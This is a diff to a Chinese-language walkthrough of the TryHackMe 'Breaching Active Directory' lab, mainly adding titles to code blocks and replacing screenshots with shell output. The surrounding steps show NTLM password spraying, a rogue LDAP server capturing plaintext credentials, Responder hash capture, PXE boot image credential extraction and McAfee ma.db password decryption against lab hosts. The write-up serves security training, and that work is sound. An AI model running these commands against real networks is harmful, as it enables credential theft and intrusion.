@@ -2,7 +2,7 @@
 sidebar_position: 2
 ---
 
-# Breaching Active Directory
+# Breaching Active Directory - Active Directory 突破
 
 > [TryHackMe | Breaching Active Directory](https://tryhackme.com/room/breachingad)
 >
@@ -142,7 +142,7 @@ python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl
 
 :::note 本地执行结果
 
-```shell
+```shell title="NTLM Password Spraying Attack"
 $python3 ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/
 [*] Starting passwords spray attack using the following password: Changeme123
 [-] Failed login with Username: anthony.reynolds
@@ -264,11 +264,16 @@ nc -lvp 389
 
 您应该会看到我们得到了一个回连，但有一个小问题：
 
-<div style={{textAlign:'center'}}>
-
-![打印机 回连 数据](img/image_20231231-203153.png)
-
-</div>
+```shell title="Netcat LDAP Listener"
+[thm@thm]$ nc -lvp 389
+listening on [any] 389 ...
+10.10.10.201: inverse host lookup failed: Unknown host
+connect to [10.10.10.55] from (UNKNOWN) [10.10.10.201] 49765
+0?DC?;
+?
+?x
+ objectclass0?supportedCapabilities
+```
 
 您可能需要多次尝试才能收到连接，但它应在 5 秒内作出回应。supportedCapabilities 响应说明我们遇到了问题。从本质上讲，打印机在发送凭证之前，正在尝试协商 LDAP 身份验证方法的详细信息。它将通过协商选择打印机和 LDAP 服务器都支持的最安全的身份验证方法。如果身份验证方法过于安全，则不会以明文传输凭证。对于某些身份验证方法，凭据根本不会通过网络传输！因此，我们不能只使用普通的 Netcat 来获取凭据。我们需要创建一个流氓 LDAP 服务器，并对其进行不安全配置，以确保以明文方式发送凭证。
 
@@ -365,17 +370,19 @@ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo servic
 
 我们可以使用以下命令验证我们的恶意 LDAP 服务器的配置是否已应用（ 注意 ：如果您使用 Kali，您可能不会收到任何输出，但配置应该已生效，您可以继续执行后续步骤）：
 
-<div style={{textAlign:'center'}}>
-
-![验证 ldap 服务器配置情况](img/image_20231244-204423.png)
-
-</div>
+```shell title="LDAP搜索以验证支持的身份验证机制"
+         
+[thm@thm]$ ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
+dn:
+supportedSASLMechanisms: PLAIN
+supportedSASLMechanisms: LOGIN
+```
 
 ### 捕获 LDAP 凭证
 
 我们的恶意 LDAP 服务器现已配置完毕。当我们点击 `http://printer.za.tryhackme.com/settings.aspx` 上的 "测试设置" 时，验证将以明文进行。如果你正确配置了流氓 LDAP 服务器，而它正在降级通信，你将会收到以下错误： "此区分名称包含无效语法"。如果收到此错误，可以使用 tcpdump 命令捕获凭据：
 
-```shell
+```shell title="TCPDump"
 $sudo tcpdump -SX -i breachad tcp port 389
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on breachad, link-type RAW (Raw IP), snapshot length 262144 bytes
@@ -450,11 +457,12 @@ sudo responder -I breachad
 
 如果您使用的是 AttackBox，则无法启动所有 Responder 服务，因为其他服务已经在使用这些端口。不过，这不会影响本任务。Responder 现在将监听收到的任何 LLMNR、NBT-NS 或 WPAD 请求。我们会让 Responder 在真正的局域网上运行一段时间。但是，在我们的情况下，我们必须通过让其中一台服务器尝试对 VPN 上的机器进行身份验证来模拟这种中毒。让 Responder 运行一段时间（平均 10 分钟，呼吸一下新鲜空气！）后，您应该会收到一个 SMBv2 连接，Responder 可以利用该连接诱导并提取 NTLMv2-SSP 响应。它看起来像这样
 
-<div style={{textAlign:'center'}}>
-
-![Responder 运行效果](img/image_20231202-210243.png)
-
-</div>
+```shell title="NTLM 密码喷射攻击"
+[+] Listening for events...
+[SMBv2] NTLMv2-SSP Client   : <Client IP>
+[SMBv2] NTLMv2-SSP Username : ZA\<Service Account Username>
+[SMBv2] NTLMv2-SSP Hash     : <Service Account Username>::ZA:<NTLMv2-SSP Hash>
+```
 
 如果我们使用的是流氓设备，我们可能会运行 Responder 一段时间，捕获几个响应。一旦有了几个，我们就可以开始对响应进行离线破解，希望能恢复其相关的 NTLM 密码。如果账户配置了弱密码，我们就很有可能成功破解它们。将 NTLMv2-SSP 哈希值复制到文本文件中。然后，我们将使用本任务下载文件中提供的密码列表和 Hashcat，尝试使用以下命令破解哈希值：
 
@@ -561,7 +569,7 @@ ssh thm@THMJMP1.za.tryhackme.com
 
 要确保网络中的所有用户都能使用 SSH，首先要创建一个包含用户名的文件夹，并将 powerpxe repo 复制到该文件夹中：
 
-```shell
+```shell title="SSH Command Prompt"
 C:\Users\THM>cd Documents
 C:\Users\THM\Documents> mkdir <username>
 C:\Users\THM\Documents> copy C:\powerpxe <username>\
@@ -570,14 +578,14 @@ C:\Users\THM\Documents\> cd <username>
 
 我们需要执行的第一步是使用 TFTP 下载 BCD 文件，以读取 MDT 服务器的配置。TFTP 比 FTP 要麻烦一些，因为我们不能列出文件。相反，我们发送一个文件请求，服务器会通过 UDP 连接回我们以传输文件。因此，我们在指定文件和文件路径时必须准确无误。BCD 文件始终位于 MDT 服务器上的 /Tmp/ 目录中。我们可以在 SSH 会话中使用以下命令启动 TFTP 传输：
 
-```shell
+```shell title="SSH Command Prompt"
 C:\Users\THM\Documents\Am0> tftp -i <THMMDT IP> GET "\Tmp\x64{39...28}.bcd" conf.bcd
 Transfer successful: 12288 bytes in 1 second(s), 12288 bytes/s
 ```
 
 您必须使用 `nslookup thmmdt.za.tryhackme.com` 查找 THMMDT IP。恢复 BCD 文件后，我们将使用 [Powerpxe](https://github.com/wavestone-cdt/powerpxe) 读取其内容。Powerpxe 是一个 PowerShell 脚本，可自动执行此类攻击，但结果通常各不相同，因此最好还是手动执行。我们将使用 powerpxe 的 Get-WimFile 功能从 BCD 文件中恢复 PXE 启动映像的位置：
 
-```shell
+```shell title="SSH Command Prompt"
 C:\Users\THM\Documents\Am0> powershell -executionpolicy bypass
 Windows PowerShell
 Copyright (C) Microsoft Corporation. All rights reserved.
@@ -592,7 +600,7 @@ PS C:\Users\THM\Documents\am0> Get-WimFile -bcdFile $BCDFile
 
 WIM 文件是 Windows 映像格式 (WIM) 的可启动映像。现在我们已经有了 PXE 引导映像的位置，可以再次使用 TFTP 下载该映像：
 
-```shell
+```shell title="SSH Command Prompt"
 PS C:\Users\THM\Documents\am0> tftp -i <THMMDT IP> GET "<PXE Boot Image Location>" pxeboot.wim
 Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
 ```
@@ -605,7 +613,7 @@ Transfer successful: 341899611 bytes in 218 second(s), 1568346 bytes/s
 
 我们将再次使用 powerpxe 恢复凭据，但您也可以通过提取映像并查找 bootstrap.ini 文件手动完成此步骤，此类凭据通常存储在该文件中。要使用 powerpxe 从引导文件中恢复凭据，请运行以下命令：
 
-```shell
+```shell title="SSH Command Prompt"
 PS C:\Users\THM\Documents\am0> Get-FindCredentials -WimFile pxeboot.wim
 >> Open pxeboot.wim
 >>>> Finding Bootstrap.ini
@@ -664,7 +672,7 @@ McAfee 将安装过程中用于连接回协调器的凭证嵌入一个名为 ma.
 
 ma.db 文件存储在一个固定位置：
 
-```shell
+```shell title="SSH Command Prompt"
 thm@THMJMP1 C:\Users\THM>cd C:\ProgramData\McAfee\Agent\DB
 thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
  Volume in drive C is Windows 10
@@ -681,7 +689,7 @@ thm@THMJMP1 C:\ProgramData\McAfee\Agent\DB>dir
 
 我们可以使用 SCP 将 ma.db 复制到我们的 AttackBox：
 
-```shell
+```shell title="Terminal"
 thm@thm:~/thm# scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db .
 thm@10.200.4.249's password:
 ma.db 100%  118KB 144.1KB/s   00:00
@@ -689,7 +697,7 @@ ma.db 100%  118KB 144.1KB/s   00:00
 
 要读取数据库文件，我们将使用名为 sqlitebrowser 的工具。我们可以使用以下命令打开数据库：
 
-```shell
+```shell title="Terminal"
 thm@thm:# sqlitebrowser ma.db
 ```
 
@@ -711,13 +719,13 @@ thm@thm:# sqlitebrowser ma.db
 
 您需要解压缩 mcafee-sitelist-pwd-decryption.zip 文件：
 
-```shell
+```shell title="Terminal"
 thm@thm:~/root/Rooms/BreachingAD/task7/$ unzip mcafeesitelistpwddecryption.zip
 ```
 
 通过向脚本提供经过 base64 编码和加密的密码，脚本将提供解密后的密码：
 
-```shell
+```shell title="Terminal"
 thm@thm:~/root/Rooms/BreachingAD/task7/mcafee-sitelist-pwd-decryption-master$ python2 mcafee_sitelist_pwd_decrypt.py <AUTH PASSWD VALUE>
 Crypted password   : <AUTH PASSWD VALUE>
 Decrypted password : <Decrypted Pasword>
